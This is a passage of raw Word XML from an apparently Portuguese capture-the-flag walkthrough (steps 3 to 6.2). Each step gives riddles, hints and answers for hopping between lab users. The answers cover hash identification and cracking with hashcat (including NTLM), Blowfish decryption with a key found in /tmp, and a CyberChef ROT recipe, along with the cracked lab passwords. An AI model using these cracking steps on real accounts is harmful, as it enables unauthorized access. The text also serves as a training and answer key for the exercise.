        <w:t xml:space="preserve">Muda de utilizador e verifica os ficheiros do utilizador novamente, é aconselhavel transferires este ficheiro png para a tua máquina com o comando </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode3"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        </w:rPr>
        <w:t>get xerox.png</w:t>
      </w:r>
      <w:r>
        <w:t>. De seguida, muda a extensão da imagem para pdf e verifica o conteúdo, depois desencripta com uma receita no cyberchef do base mais baixo para o mais alto.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D1A6F08" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pageBreakBefore/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A225542" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="122" w:name="_Toc213874728"/>
      <w:bookmarkStart w:id="123" w:name="_Toc213881926"/>
      <w:r>
        <w:t>Passo 3:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="122"/>
      <w:bookmarkEnd w:id="123"/>
    </w:p>
    <w:p w14:paraId="522D862A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Talvez já tenhas percebido que cada task requer mudar de utilizador para avançar, troca para o novo user que descobriste.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3780D426" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Explora a pasta deste novo utilizador, há alguma coisa que te chame a atenção?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="645775F1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Riddle</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A548AFA" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Três métodos antigos guardam o Zé,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="686445ED" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Quem souber o trio verá abrir</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math" w:cs="Cambria Math"/>
        </w:rPr>
        <w:noBreakHyphen/>
      </w:r>
      <w:r>
        <w:t>se o c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:rFonts w:cs="Arial"/>
        </w:rPr>
        <w:t>é</w:t>
      </w:r>
      <w:r>
        <w:t>u.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69DB7C46" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Hint</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="243B67D7" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Experimenta usar Hash-Identifier</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="160B77DA" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Answer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5101AA61" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">Troca novamente de utilizador e verifica o conteúdo do mesmo. Usa o Hash-Identifier para confirmar que aquelas hashes afinal não eram um SHA, mas sim MD's. De seguida experimenta usar novamente o hashcat ou o </w:t>
      </w:r>
      <w:hyperlink r:id="rId26" w:history="1">
        <w:r w:rsidR="004253CC">
          <w:rPr>
            <w:rStyle w:val="Hiperligao"/>
          </w:rPr>
          <w:t>CrackStation</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47F23051" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31346E8A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Citao"/>
        <w:rPr>
          <w:i w:val="0"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i w:val="0"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Anthrax:7b61467a0e5084ff727ac81a79cfa3a1 - gnillaF - MD5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4381792D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="59129368" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Citao"/>
        <w:rPr>
          <w:i w:val="0"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i w:val="0"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>MegaDeth:c1db7f29e6b551f4fa48d6901eca6be6 - nI - MD2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38ADD160" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="7F462C7C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Citao"/>
        <w:rPr>
          <w:i w:val="0"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i w:val="0"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>ToddlerStomper:2bfbbe5800dd0874b39bd5a07952cf62 - esreveR - MD4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42257E5E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="336DB697" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Citao"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:i w:val="0"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">ze:f8e8eb9612969985e7df4657f8c49bddcbddf8c509bc82799eaa4d1fcaa1360b - SHA256 - esreveRnIgnillaF - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:i w:val="0"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>NOTA:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:i w:val="0"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Esta password não deve tentar ser crackada, mas caso consigas fazê-lo, dás skip aos passos anteriores.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13027B8D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Junta as passwords e troca de utilizador novamente.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="614A88A4" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pageBreakBefore/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0368F32B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="124" w:name="_Toc213874729"/>
      <w:bookmarkStart w:id="125" w:name="_Toc213881927"/>
      <w:r>
        <w:t>Passo 4:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="124"/>
      <w:bookmarkEnd w:id="125"/>
    </w:p>
    <w:p w14:paraId="6C456833" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Parabéns, descobriste a password do Zé, explora o novo utilizador e descobre como saltar para o próximo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DBB537B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Riddle</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="567E5F56" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>No Windows esconde-se, password em hash fiel,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="491C5549" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">Protege segredos num vídeo cru e cruel. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F00B2B3" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Hint</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D46D6C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>NTLM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48768D65" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Answer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="071B2846" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Verifica o conteúdo da nota do Zé, vais encontrar uma hash em NTLM, volta a usar o hashcat para crackar a pass (código NTLM 1000) e entra na pasta que pedia uma password.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37E4AAF8" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Citao"/>
        <w:rPr>
          <w:i w:val="0"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i w:val="0"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>db857fd3645b89250512f9e63af64995 - ROCKNROLL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A7FC602" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode3"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        </w:rPr>
        <w:t>get passdorafa.mp4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72DC135D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Vê o vídeo e encontra a password do Rafa.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FDFD26A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Citao"/>
        <w:rPr>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Password: 1337</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4898219F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pageBreakBefore/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F4EA702" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="126" w:name="_Toc213874730"/>
      <w:bookmarkStart w:id="127" w:name="_Toc213881928"/>
      <w:r>
        <w:t>Passo 5:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="126"/>
      <w:bookmarkEnd w:id="127"/>
    </w:p>
    <w:p w14:paraId="5769ADD3" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Parece que esta foi fácil, não?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C3E570A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Lê o conteúdo da nota do Rafa e escala para o próximo utilizador.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E9DD6E0" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Riddle</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18492AB7" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Numa pasta provisória do servidor jaz um ficheiro a apagar.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49F87211" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">As hashes sopram para o peixe. Rodrigo, corre e muda a password, vai lá já trocar! </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B3CC9DF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Hint</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="461945BB" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>BlowFish</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5294E8FB" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Answer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35BABB0D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Verifica o conteúdo da pasta do Rafa, vais encontrar uma nota, lê o conteúdo e percebes que eles estavam a desenvolver um código, porém a aplicação tem um sistema de logins e a password que o Rodrigo usa na app e no servidor são as mesmas. No entanto, o código não foi guardado, pois o computador desligou abruptamente. Porém, ainda existe um backup guardado na cache do sistema. Navega até à pasta /tmp e lê o conteúdo de um script em python. Vais encontrar a key, o IV e o modo e perceber que a encriptação usada foi blowfish. Pega na password do Rodrigo e desencripta.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57A6C1B4" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Citao"/>
        <w:rPr>
          <w:i w:val="0"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i w:val="0"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Key - biboportosuperbock IV - 1893189318931893 Mode - CBC ce3235ccb154281220928928b7fc5294291eea1fc450a7782a17a31a52625f91 - Palmeirasnaotemmundial123!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33620A61" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pageBreakBefore/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53350BF8" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="128" w:name="_Toc213874731"/>
      <w:bookmarkStart w:id="129" w:name="_Toc213881929"/>
      <w:r>
        <w:t>Passo 6.1:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="128"/>
      <w:bookmarkEnd w:id="129"/>
    </w:p>
    <w:p w14:paraId="3519160A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Há várias formas de alguém guardar uma key. Algumas formas mais tradicionais, outras mais modestas. Outras violam o RGPD.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E6F5B85" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Com o stress de ser pai, a memória do Rodrigo já não é o que era. Ele usa outros métodos para se recordar das suas keys.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3116C7A6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Encontraste ficheiros peculiares dentro da pasta do Rodrigo, será algum deles importante? Ou só recordações irrelevantes?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F5E5F9" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Explora a pasta do Rodrigo, a partir daqui, talvez consigas chegar a root.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="618463E9" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Riddle</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EF9D569" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Fotos dum jogo escondem uma semente guardada,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="417CE8F9" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>O Jimbo ri, lá está a chave bem guardada.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70026B66" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Hint</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27DF2B2E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>BALATRO</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="378858C1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Answer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04C1C42D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>6.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="188FA095" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Verifica o conteúdo da pasta do Rodrigo, vais achar algumas fotos de jogos que ele usa para passar o tempo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59102A60" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Alguns detalhes das fotos são as chaves para a sua pasta pessoal.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C369232" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>A key para a pasta pessoal é a seed usada na foto do Balatro.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34936287" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Citao"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Key - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode3"/>
          <w:i w:val="0"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        </w:rPr>
        <w:t>SZ6QVP4Q</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1537B122" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pageBreakBefore/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="149321E6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="130" w:name="_Toc213874732"/>
      <w:bookmarkStart w:id="131" w:name="_Toc213881930"/>
      <w:r>
        <w:t>Passo 6.2:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="130"/>
      <w:bookmarkEnd w:id="131"/>
    </w:p>
    <w:p w14:paraId="6B881F09" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Parece que descobriste o método do Rodrigo guardar as suas passwords, mas serás capaz de desvendar o enigma do Rodrigo?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="601B9C18" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Riddle</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E40406E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>A rotação dourada gira com o que está guardado,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F46B2B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Do maior ao menor, o segredo é revelado.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38C014BB" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Hint</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BE8280B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>ROT(x) está para ROT(Fibonacci)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54550D3B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Hint 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DE9651A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FencedCode"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,987]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,610]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,377]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,233]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,144]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,89]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,55]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,34]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,21]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,13]},</w:t>
